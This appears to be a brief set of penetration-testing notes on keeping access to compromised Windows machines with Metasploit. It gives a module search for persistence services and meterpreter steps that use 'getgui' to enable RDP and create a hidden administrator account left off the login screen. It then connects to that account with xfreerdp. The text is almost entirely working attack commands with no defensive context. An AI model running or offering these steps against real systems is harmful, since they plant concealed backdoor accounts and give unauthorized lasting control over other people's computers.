
Services
=

### msfmodules

`search platform:windows persistence` - use the service module


Backdoor User (via RDP)
=
get a 64bit meterpreter session - requires stable shell
admin privs required

in meterpreter:
1. `run getgui -e -u username -p password` - checks if rdp is enabled, if not, enables, and create new user, hides user from windows login screen, add user to remote desktop users group and administrators group
2. `xfreerdp /u:username /p:password /v:targetip` - connect to pc via rdp